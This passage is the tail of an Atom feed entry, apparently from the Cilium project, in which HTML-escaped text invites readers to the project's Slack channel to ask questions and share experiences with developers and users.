href=&#34;https://cilium.herokuapp.com/&#34;&gt;Slack channel&lt;/a&gt; to chat with developers, maintainers, and other users. This is a good first stop to ask questions and share your experiences.&lt;/p&gt;</summary>
  </entry>
</feed>